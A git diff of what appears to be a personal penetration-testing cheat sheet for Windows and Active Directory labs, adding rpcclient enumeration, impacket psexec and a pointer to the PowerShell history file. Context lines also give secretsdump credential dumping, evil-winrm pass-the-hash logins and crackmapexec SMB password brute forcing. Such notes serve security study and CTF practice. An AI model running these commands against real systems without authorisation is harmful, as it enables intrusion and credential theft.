@@ -25,6 +25,11 @@ and crack it
 ## access shares if you have creds
 `smbclient //[IP]/[sharename] --user=[user]`
 
+## enum basic info with rpcclient
+`rpcclient [domain-name] -U [username]`
+> enumdomusers
+> enumdomgroups
+
 ## try to dump secrets of you have creds
 `python3 ~/scripts/impacket/examples/secretsdump.py -target-ip [IP] [domain-name]/[full-username] -outputfile secretsdump.log`
 or
@@ -33,6 +38,10 @@ or
 ## got NTLM hash? got password? got user? evil-winrm time
 `evil-winrm -i [IP] -u [user] -H [NTLM hash]`
 or just use the password if you got one
+
+or just psexec
+`python3 ~/scripts/impacket/examples/psexec.py [username]@[ip_address]`
+
 
 ## Try Bruteforce SMB with crackmapexec
 `crackmapexec smb <MACHINE-IP> -u <username> -p <wordlist>`
@@ -48,3 +57,7 @@ ex: `crackmapexec smb 10.10.153.204 -u Jareth -p ~/wordlists/rockyou.txt`
 cd 'C:\$Recycle.bin\<SID>'
 ex:
 cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
+
+## Check the powershell history (Ini ada di semua windows)
+C:\Users\[username]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
